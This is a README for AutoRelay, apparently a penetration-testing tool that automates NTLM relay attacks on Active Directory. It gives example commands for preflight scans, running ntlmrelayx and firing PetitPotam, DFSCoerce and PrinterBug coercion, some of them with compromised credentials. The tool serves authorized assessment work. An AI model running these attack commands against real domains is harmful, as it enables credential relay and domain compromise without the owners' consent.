# AutoRelay

**AutoRelay** is an authorized Active Directory assessment tool designed to automate the lifecycle of an NTLM Relay attack.

It handles the entire orchestration process: from reconnaissance and vulnerability scanning, to starting the relay server, firing coercion vectors, and generating professional client-facing reports.

## Features

*   **Preflight Assessment:** Checks target reachability, SMB signing status, LDAP signing, and coercion vector availability without firing any offensive traffic.
*   **Relay Orchestration:** Automatically starts and manages `ntlmrelayx` in the background, parsing its output in real-time to detect intercepted sessions.
*   **Coercion Dispatcher:** Attempts multiple coercion vectors in sequence (PetitPotam, DFSCoerce, PrinterBug), with support for authenticated coercion using compromised credentials.
*   **Safety Guardrails:** Enforces strict scope files in `live` mode to prevent accidental out-of-scope attacks. Refuses to run if `--yes` is used in production.
*   **Reporting:** Generates detailed Markdown and HTML reports mapping findings to concrete remediations.

## Requirements

*   **OS:** Linux (Kali, Ubuntu, Debian) or WSL
*   **Python:** 3.10 or higher
*   **Privileges:** Root/Sudo required to bind to privileged ports (445, 80) for the relay server.

## Installation

```bash
# 1. Clone the repository
git clone https://github.com/yourusername/autorelay.git
cd autorelay

# 2. Create a virtual environment
python3 -m venv .venv
source .venv/bin/activate

# 3. Install dependencies
pip install --upgrade pip
pip install -r requirements.txt

# 4. Verify installation
python autorelay.py --help

Usage
AutoRelay has two execution profiles:

goad (Lab): No scope enforcement. Use this for testing against intentionally vulnerable labs (like GOAD).

live (Production): Strict scope enforcement. Requires a scope.yaml file and will refuse to attack out-of-scope IPs.

1. Preflight (Read-Only)
Check if a target environment is vulnerable to an NTLM relay attack. This command performs no active attacks.

python autorelay.py --profile goad preflight \
    --target 192.168.56.10 \
    --relay-targets 192.168.56.10 \
    --html report.html \
    --json report.json

2. Run (Active Attack)
Execute the full attack chain: Preflight -> Start Relay -> Fire Coercion -> Catch Session.

Before running the live profile, you must create a scope file:

# Copy the template
cp scope.example.yaml scope.yaml

# Edit the file and add the authorized IPs
nano scope.yaml

Unauthenticated Coercion (Older/Lab environments):
This uses PetitPotam or DFSCoerce without credentials. It is often blocked by modern Windows patches.

sudo .venv/bin/python autorelay.py --profile live --scope scope.yaml run \
    --target 10.10.10.5 \
    --relay-targets 10.10.10.5 \
    --listener-ip 10.10.10.100 \
    --timeout 60

Authenticated Coercion (Modern/Patched environments):
If you have compromised credentials (e.g., a low-privileged user), you can bypass anonymous restrictions on modern Domain Controllers.

sudo .venv/bin/python autorelay.py --profile live --scope scope.yaml run \
    --target 10.10.10.5 \
    --relay-targets 10.10.10.5 \
    --listener-ip 10.10.10.100 \
    --username jdoe \
    --password 'Password123!' \
    --domain CORP \
    --timeout 60

3. Manual Trigger (For Demos or Blocked Coercion)
If all coercion vectors are patched on the target (common in Windows Server 2022), you can skip the automated trigger and wait for a manual connection. This is useful for demonstrating the relay engine itself.

sudo .venv/bin/python autorelay.py --profile live --scope scope.yaml run \
    --target 10.10.10.5 \
    --relay-targets 10.10.10.5 \
    --listener-ip 10.10.10.100 \
    --no-coerce \
    --timeout 120

Project Structure

autorelay/
├── autorelay.py          # CLI entry point and orchestrator
├── config.py             # Profile loader and scope enforcement
├── config.yaml           # Profile definitions (goad/live)
├── scope.example.yaml    # Template for authorization scope
├── requirements.txt      # Python dependencies
├── preflight/            # Read-only reconnaissance checks
├── coercion/             # Coercion vectors (PetitPotam, DFSCoerce, PrinterBug)
├── relay/                # ntlmrelayx subprocess wrapper
├── report/               # Markdown and HTML report generation
└── util/                 # Logging, networking, and helpers


See [Module Interfaces](docs/MODULE_INTERFACES.md#relay) for supported checks, finding interpretation, limits, and LDAP policy evidence requirements.

## Documentation

- [Software Requirements Specification](docs/SRS.md)
- [Architecture](docs/ARCHITECTURE.md)
- [Module Interfaces](docs/MODULE_INTERFACES.md)
- [Contributing Guidelines](CONTRIBUTING.md)

Review the module interfaces before implementing or integrating a component.
## Authorization

AutoRelay is intended only for authorized security assessments and controlled laboratory environments.

Do not use this tool against systems without explicit authorization.
